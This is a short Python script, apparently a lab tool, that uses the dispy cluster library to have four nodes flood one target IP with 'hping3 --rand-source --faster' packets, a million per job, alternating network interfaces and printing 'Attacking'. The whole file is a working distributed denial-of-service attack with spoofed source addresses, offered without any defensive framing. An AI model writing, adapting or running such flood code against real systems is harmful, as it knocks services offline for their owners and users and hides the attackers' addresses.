def run(ip_to_attack, count, interface, alternate):
    import subprocess
    try:
        subprocess.run([f'sudo hping3 --rand-source -I {interface} --faster -c {count} {ip_to_attack}'],shell=True)
    except Exception as e:
        subprocess.run([f'sudo hping3 --rand-source -I {alternate} --faster -c {count} {ip_to_attack}'],shell=True) 

# dispy calls this function to indicate change in job status
def job_callback(job): # executed at the client
    pass

# main 
if __name__ == '__main__':
    import dispy, random, argparse, resource, threading, logging, decimal, socket, sys, os
    import dispy.httpd
    
    server_nodes = ['10.0.0.3','10.0.0.4','10.0.0.6','10.0.0.7']
    ip_to_attack = '10.0.0.67'
    free_cpus = 13
    count = 1000000

    jobs_cond = threading.Condition()

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    cluster = dispy.JobCluster(run, ip_addr=s.getsockname()[0], nodes=server_nodes, callback=job_callback, loglevel=logging.INFO)
    
    http_server = dispy.httpd.DispyHTTPServer(cluster)
    pending_jobs = {}

    print(('Attacking %s %s' % (ip_to_attack, server_nodes)))

    i = 0
    interface_flag = False
    while i <= free_cpus:
        i += 1
        interface_flag = not interface_flag
        # schedule execution of 'compute' on a node (running 'dispynode')
        if interface_flag:
            interface = 'eth0'
            alternate = 'wlan0'
        else:
            interface = 'wlan0'
            alternate = 'eth0'
        job = cluster.submit(ip_to_attack, count, interface, alternate)

        jobs_cond.acquire()

        job.id = i 

    cluster.wait()

    
    cluster.print_status()
    cluster.close()